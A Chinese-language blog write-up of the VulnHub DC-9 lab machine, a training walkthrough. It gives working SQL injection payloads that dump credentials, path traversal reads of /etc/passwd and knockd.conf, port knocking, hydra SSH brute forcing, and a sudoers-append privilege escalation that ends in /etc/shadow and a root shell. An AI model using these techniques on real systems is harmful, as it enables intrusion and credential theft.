---
title: Vulnhub-DC-9
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-9

> https://www.vulnhub.com/entry/dc-9,412/
> 

## 端口扫描主机发现

1. 探测存活主机，`180`是靶机
    
    ```php
    netdiscover -r 192.168.75.0/24
    //
    Currently scanning: 192.168.75.0/24   |   Screen View: Unique Hosts                                                  
                                                                                                                          
     4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                      
     _____________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
     -----------------------------------------------------------------------------
     192.168.75.1    00:50:56:c0:00:08      1      60  VMware, Inc.                                                       
     192.168.75.2    00:50:56:fb:ca:45      1      60  VMware, Inc.                                                       
     192.168.75.180  00:0c:29:41:e1:8f      1      60  VMware, Inc.                                                       
     192.168.75.254  00:50:56:fe:ca:7a      1      60  VMware, Inc.  
    ```
    
2. 探测主机所有开放端口，仅存在`80`端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.180
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 12:14 CST
    Nmap scan report for 192.168.75.180
    Host is up (0.00038s latency).
    Not shown: 65534 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    80/tcp open  http
    MAC Address: 00:0C:29:41:E1:8F (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80 192.168.75.180
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 12:16 CST
    Nmap scan report for 192.168.75.180
    Host is up (0.00058s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    MAC Address: 00:0C:29:41:E1:8F (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80 192.168.75.180 
    //
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 12:10 CST
    Nmap scan report for 192.168.75.180
    Host is up (0.00020s latency).
    
    PORT   STATE SERVICE
    80/tcp open  http
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.180
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.180:80/manage.php
    |     Form id: 
    |     Form action: manage.php
    |     
    |     Path: http://192.168.75.180:80/search.php
    |     Form id: 
    |_    Form action: results.php
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-enum: 
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
    |_  /includes/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    MAC Address: 00:0C:29:41:E1:8F (VMware)
    ```
    

## web渗透

1. 访问主页，网站指纹识别不是知名`CMS`
    
    ![image.png](image%2046.png)
    
    - `Display All Records` 页面是所有用户的信息
    - `Search` 为搜索页面，存在搜索框
    - `Manage` 是登陆页面
2. 扫描网站目录
    
    ```python
    dirsearch -u 192.168.75.180 -x 403,404
    //
    [12:24:00] Starting:                                                                                                                                                                                              
    [12:24:22] 200 -    0B  - /config.php                                       
    [12:24:23] 301 -  314B  - /css  ->  http://192.168.75.180/css/              
    [12:24:25] 200 - 1001B  - /display.php                                      
    [12:24:31] 301 -  319B  - /includes  ->  http://192.168.75.180/includes/    
    [12:24:31] 200 -  408B  - /includes/
    [12:24:35] 302 -    0B  - /logout.php  ->  manage.php                       
    [12:24:36] 200 -  548B  - /manage.php                                       
    [12:24:48] 200 -  485B  - /search.php      
    ```
    
3. `Search` 为搜索页面，可能存在`SQL`注入，抓包修改`POST`参数
    - 尝试闭合
        
        ```python
        search=0' # 无结果
        search='or'1'='1 # 结果出来了，是Display All Records的结果
        ```
        
        确认存在注入
        
    - 继续注入（其实可以用`sqlmap`注入）
        
        ```python
        search='or'1'='1' order by 6 %23 # 字段数为6
        search='or'1'='0' union select 1,2,3,4,5,6 %23 # 显示位，全都可以显示
        search='or'1'='0' union select user(),2,3,version(),database(),6 %23 # dbuser@localhost ，10.3.17-MariaDB-0+deb10u1 ，Staff
        
        ```
        
    - 表名
        
        ```python
        search='or'1'='0' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database() %23
        ```
        
        `StaffDetails,Users` ，我们需要`Users` 表的数据
        
    - 列名
        
        ```python
        search='or'1'='0' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_schema=database() and table_name='Users' %23
        ```
        
        `UserID,Username,Password`
        
    - 数据
        
        ```python
        search='or'1'='0' union select group_concat('~',Username,':',Password,'~'),2,3,4,5,6 from Users %23
        ```
        
        `admin:856f5de590ef37314e7c3bdf6f8a66dc` 拿到`admin`账户，密码看着像是`MD5`加密后的，使用网站破解出来为`transorbital1`
        
    - 顺便再把`users`库的`UserDetails` 表数据也扒下来
        
        ```python
        +----+------------+---------------+---------------------+-----------+-----------+
        | id | lastname   | password      | reg_date            | username  | firstname |
        +----+------------+---------------+---------------------+-----------+-----------+
        | 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
        | 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
        | 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
        | 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
        | 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
        | 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
        | 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
        | 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
        | 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
        | 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
        | 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
        | 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
        | 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
        | 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
        | 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
        | 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
        | 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
        +----+------------+---------------+---------------------+-----------+-----------+
        ```
        
4. 尝试登录后台，成功登录，寻找可以利用的点
    
    ![image.png](image%2047.png)
    
5. 进入后台发现底下写着`File does not exist` 可能存在某个参数，使用常见参数进行测试比如`file`
    
    ```python
    /manage.php?file=../../../../etc/passwd
    ```
    
    回显`/etc/passwd`文件内容
    
    ```python
    File does not exist
    root:x:0:0:root:/root:/bin/bash 
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
    bin:x:2:2:bin:/bin:/usr/sbin/nologin 
    sys:x:3:3:sys:/dev:/usr/sbin/nologin 
    sync:x:4:65534:sync:/bin:/bin/sync 
    games:x:5:60:games:/usr/games:/usr/sbin/nologin 
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin 
    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin 
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
    mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false 
    marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash 
    julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash 
    fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash 
    barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash 
    tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash 
    jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash 
    wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash 
    bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash 
    chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash 
    joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash 
    rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash 
    rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash 
    monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash 
    phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash 
    scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash 
    janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash 
    janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash 
    ```
    
    可以看到用户是`UserDetails`表内的用户，密码可能就是`SSH`登录的密码，虽然扫描不到`SSH`，但是可能还是存在的
    

## **隐藏的SSH**

1. 我们重新扫描一下端口
    
    一开始我们使用的是：`nmap -sT -min-rate 10000 -p- 192.168.75.180` 即建立完TCP链接后才表示有该端口
    
    我们重新使用：`nmap -sS -min-rate 10000 -p- 192.168.75.180` 即在建立TCP前的三次握手协议中的第一步，我们发送一个SYN包看对方是否回复，`SYN/ACK`表示端口在监听 (开放)， 该端口就被标记为被过滤`filtered`
    
    ```python
    nmap -sS -min-rate 10000 -p- 192.168.75.180
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 13:45 CST
    Nmap scan report for 192.168.75.180
    Host is up (0.00011s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE    SERVICE
    22/tcp filtered ssh
    80/tcp open     http
    MAC Address: 00:0C:29:41:E1:8F (VMware)
    ```
    
    重新扫描后可以看到`SSH`端口是被过滤`filtered` 状态的，所以可能就是存在`SSH`的，但是被防火墙过滤了
    
2. 一般隐藏`SSH`是通过`Knockd`
    
    > https://www.cnblogs.com/guangdelw/p/18402272
    > 
    
    `Knockd` 的配置文件在`/etc/knockd.conf` ，我们包含确定是否是`Knockd`
    
    ```python
    /manage.php?file=../../../../etc/knockd.conf
    ```
    
    成功包含！也就是说通过`Knockd`来隐藏了`SSH`服务
    
    ```python
    File does not exist
    [options] 
    	UseSyslog 
    [openSSH] 
    	sequence = 7469,8475,9842 
    	seq_timeout = 25 
    	command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT 
    	tcpflags = syn 
    [closeSSH] 
    	sequence = 9842,8475,7469 
    	seq_timeout = 25 
    	command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT 
    	tcpflags = syn 
    ```
    
    分析一下配置文件：依次使用`TCP`访问`7469,8475,9842` 后（不超过25秒），则执行`[openSSH]` 区块的`command` ，用于允许来源IP（`%IP%`）的TCP连接通过22端口（SSH端口）
    
3. 分析完后，接下来就是进行敲门
    - 使用`Kocked` 命令敲门
        
        ```python
        knock 192.168.75.180 7469 8475 9842
        ```
        
    - 然后再使用`nmap`扫描看看
        
        ```python
        nmap -sT -min-rate 10000 -p- 192.168.75.180
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 14:09 CST
        Nmap scan report for 192.168.75.180
        Host is up (0.00040s latency).
        Not shown: 65533 closed tcp ports (conn-refused)
        PORT   STATE SERVICE
        22/tcp open  ssh
        80/tcp open  http
        MAC Address: 00:0C:29:41:E1:8F (VMware)
        ```
        
        这下`SSH`端口就打开了
        

## 爆破SSH

1. 将`UserDetails`表的`username`和`password`字段分别保存
    
    ```python
    hydra -L username -P password -vV -e ns 192.168.75.180 ssh
    ```
    
    爆破出个三用户的账号密码
    
    ```python
    [22][ssh] host: 192.168.75.180   login: janitor   password: Ilovepeepee
    [22][ssh] host: 192.168.75.180   login: chandlerb   password: UrAG0D!
    [22][ssh] host: 192.168.75.180   login: joeyt   password: Passw0rd
    ```
    

## 提权

1. janitor
    
    ```python
    janitor@dc-9:~$ whoami
    janitor                                                                                                                                                                                                           
    janitor@dc-9:~$ id                                                                                                                                                                                                
    uid=1016(janitor) gid=1016(janitor) groups=1016(janitor)                                                                                                                                                          
    janitor@dc-9:~$ uname -a
    Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux   
    ```
    
2. 寻找敏感文件
    - `find /home -name *pass* 2>/dev/null`
        
        发现`/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt` ,查看
        
        ```python
        BamBam01
        Passw0rd
        smellycats
        P0Lic#10-4
        B4-Tru3-001
        4uGU5T-NiGHts
        ```
        
        将其追加到`password`后
        
3. 我们将新的`password`文件拿去爆破
    
    ```python
    hydra -L username -P password -vV -e ns 192.168.75.180 ssh
    ```
    
    炸出一个新用户，登录`ssh`
    
    ```python
    [22][ssh] host: 192.168.75.180   login: fredf   password: B4-Tru3-001
    ```
    
4. 查看新用户`fredf`的权限
    - `sudo -l` ,终于有权限了QvQ
        
        ```python
        fredf@dc-9:~$ sudo -l
        Matching Defaults entries for fredf on dc-9:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
        
        User fredf may run the following commands on dc-9:
            (root) NOPASSWD: /opt/devstuff/dist/test/test
        ```
        
5. 执行文件
    
    ```python
    fredf@dc-9:/opt/devstuff/dist/test$ ./test
    Usage: python test.py read append
    ```
    
    发现上级目录存在`test.py` 可能就是二进制文件`test`的原本的内容
    
6. 查看文件内容
    
    ```python
    ```python
    fredf@dc-9:/opt/devstuff$ cat test.py 
    #!/usr/bin/python
    
    import sys
    
    if len (sys.argv) != 3 :
        print ("Usage: python test.py read append")
        sys.exit (1)
    
    else :
        f = open(sys.argv[1], "r")
        output = (f.read())
    
        f = open(sys.argv[2], "a")
        f.write(output)
        f.close()
    ```
    ```
    
    - 如果参数数量不等于3（脚本名称和两个文件名），程序会打印用法提示并退出
    - 使用`open()`函数以只读模式打开第一个文件（`sys.argv[1]`），并将其内容读入变量`output`。
    - 打开第二个文件（`sys.argv[2]`）以附加模式（"a"）打开，并将从第一个文件读取的内容写入。
    
    思路：我们可以附加内容到 `/etc/sudoers` ,将当前用户`fredf` 附加`fredf ALL=(ALL) NOPASSWD: ALL` ****权限
    
7. 创建文件 `test`内容是 `fredf ALL=(ALL) NOPASSWD: ALL`
    
    ```python
    # nano test
     fredf ALL=(ALL) NOPASSWD: ALL
    ```
    
8. 执行二进制文件
    
    ```python
    fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test test /etc/sudoers
    ```
    
    测试是否拥有权限
    
    ```python
    fredf@dc-9:/tmp$ sudo cat /etc/shadow
    root:$6$lFbb8QQt2wX7eUeE$6NC9LUG7cFwjIPZraeiOCkMqsJ4/4pndIOaio.f2f0Lsmy2G91EyxJrEZvZYjmXRfJK/jOiKK0iTGRyUrtl2R0:18259:0:99999:7:::
    daemon:*:18259:0:99999:7:::
    bin:*:18259:0:99999:7:::
    sys:*:18259:0:99999:7:::
    sync:*:18259:0:99999:7:::
    games:*:18259:0:99999:7:::
    man:*:18259:0:99999:7:::
    lp:*:18259:0:99999:7:::
    mail:*:18259:0:99999:7:::
    news:*:18259:0:99999:7:::
    uucp:*:18259:0:99999:7:::
    proxy:*:18259:0:99999:7:::
    www-data:*:18259:0:99999:7:::
    backup:*:18259:0:99999:7:::
    list:*:18259:0:99999:7:::
    irc:*:18259:0:99999:7:::
    gnats:*:18259:0:99999:7:::
    nobody:*:18259:0:99999:7:::
    _apt:*:18259:0:99999:7:::
    systemd-timesync:*:18259:0:99999:7:::
    systemd-network:*:18259:0:99999:7:::
    systemd-resolve:*:18259:0:99999:7:::
    messagebus:*:18259:0:99999:7:::
    sshd:*:18259:0:99999:7:::
    systemd-coredump:!!:18259::::::
    mysql:!:18259:0:99999:7:::
    marym:$6$EC59.EO3fZXPPMVr$61TZ96DmGiYpTCyB02YdIl0Uvu82UnFMSxlZ5HcraYN.5sgJI/E028bxjZM5S2LwwN8LImSUxfz9fXckKfRdJ0:18259:0:99999:7:::
    julied:$6$32/2fdkDb73B.Pbu$ZY/FnFR9GHSLfdhOmqYc6Qrt0MrwllJ3VjZDoyc8386oYyuYRUIPDvz3GOp36KzlnzfKObcQKbA44OFRWVaTH/:18259:0:99999:7:::
    fredf:$6$CLKIMQJIUehJJqbo$8afEl6ipZRF1LKIu8Qw9wbufGgFze6/xrBDdTr7oS6bTibipCenHJ/m/lzNj36i8pIfrsd2RVoEdA5jwxhnMZ1:18259:0:99999:7:::
    barneyr:$6$ozASzz3uY5pZ01N0$mXJ2Bh9t5vgmMpnTl6CXtvCRz5zYBr4bwYLE/0JtxPHAeFmlxJibsgQsJRemYYPbzVuFRIu9KD9CD3MFl5CJ6/:18259:0:99999:7:::
    tomc:$6$96XehDk5ozd3Yx1N$ZmrnsxS6rH1KpyMN4E0YhRPKfcP/ZacdFl7eHgTVJhFwqfxgaDGH7aLYTONEi2XjXWV.TvbGL7nU3ihiHf30Y0:18259:0:99999:7:::
    jerrym:$6$wlCURlxOqBWhare6$zq3RvAT4tdx12GoMP0BLK/TxLausSspKPCHWIQSuBVMXm8GN5Wi13FsIkvLpML93Ny8G6J/q3JEr41Pder6Q/.:18259:0:99999:7:::
    wilmaf:$6$2hEqLZyozDA001uz$LFM49N1ZO1bN1KbMuzb9jJCIonwEPNBxEvEFmIXPgAL1KvKAxgJFH494CWHUyzsizvCz780z6r1OeufCgxHUm0:18259:0:99999:7:::
    bettyr:$6$cZjlc4EB3VXiOGoY$fcW9ne5x2wQhYdnUukOcx0umnG/FSzuIGLZTRPo/VlPDWai/oM5FVaffLqSSim5xgwJ3JBerIdW6BXZWTc6gd.:18259:0:99999:7:::
    chandlerb:$6$cVQ1y2nQYgwpMKvT$3rRdWV/3d0uasARPBvZlcAtrWQZdjJsndgSIfD27yf0jGTp6hxgXrI0v5CayLtuallgbCg44gLjnbCN8NlFHk0:18259:0:99999:7:::
    joeyt:$6$FfsFOF2eFLLssCIx$Xw2h6l2tkSye/9IoYbK0a6VeGd8771UJWyeYw1m2X6Xcgc1iE0UYaZf.ySUlD8tIsS6FRxyAxEZyYspbAdvIf/:18259:0:99999:7:::
    rachelg:$6$yDoxHglucM5kjbyz$JL0k6riILYc2fDVu.S25TrVAWDXB5yjtdrhHtQkCp25oZnMTGq6dj8LJX8yGutyeNDd8mjyQT8UDtN9C6CKvA.:18259:0:99999:7:::
    rossg:$6$m7qudrh2e.QzNHjz$W/qreraYyvBJICSt12Oha2pqvjRpPcyU1nhMpHKhHTZ/X3sRE7nvkVtHh0oYrKgjYyznWn6XtDShoN6tRmeYh1:18259:0:99999:7:::
    monicag:$6$OKThUPaRpzMonEJT$VJOMjAKPip3c6MSteIsrtu/x01VwvK6CfUYmY24RU5X.jYBJYbGzCQPFBpfzXc32D2jItQL2eTYtTxrrXh9pT.:18259:0:99999:7:::
    phoebeb:$6$hv8tIcEfkNLWF0UD$JNOVj9XT0kOh/omUlPOzL8kbkNyqmcGSRuAwK97kHYEfzvP4MJnWiGTIbGuYW5wCGOzsJ2MN8e5fO5jh6f3GX/:18259:0:99999:7:::
    scoots:$6$PxiTl9DHLbYR.R9b$K6judJrN68gASxg9mOLsL./YVhs4Gt/QTtI1Qx5Wj2Fc2QpgmDZtMhfwxNMs2nUSywOdRaPobhtvb2QT.24OK.:18259:0:99999:7:::
    janitor:$6$bQhC0fZ9g9313Aat$aZ0GecSMTi1qUGqSF6eAdGu2pDXRg1Zu8JzLyyhvSAwh8MnLzv3XPnu6Vw9OruPsgAGgA2dCYdOuk9T4hgDZ6/:18259:0:99999:7:::
    janitor2:$6$HkvFAeOwjGjr6jDj$CUt0HJpmATAcPYxVjsxsYclUWFgfaGucL.c/WiavCt.op9UjqkM2yZdoDpyFW1rZbiSHCQ2MGIy0kBhcPPnhn.:18259:0:99999:7:::
    ```
    
    可以不用密码使用`sudo cat` 表示提权成功
    
9. `sudo vi`提权
    
    进入后在末尾模式下输入`!/bin/bash`
    
    ```python
    fredf@dc-9:/tmp$ sudo vi
    
    root@dc-9:/tmp# 
    ```
    
    提权成功！
    
10. 读取`flag`文件
    
    ```python
    root@dc-9:~# cat theflag.txt 
    
    ███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
    ████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
    ██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
    ██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
    ██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
    ╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                                 
    Congratulations - you have done well to get to this point.
    
    Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
    who have taken the time to complete the various DC challenges.
    
    I also want to send out a big thank you to the various members of @m0tl3ycr3w .
    
    They are an inspirational bunch of fellows.
    
    Sure, they might smell a bit, but...just kidding.  :-)
    
    Sadly, all things must come to an end, and this will be the last ever
    challenge in the DC series.
    
    So long, and thanks for all the fish.
    
    ```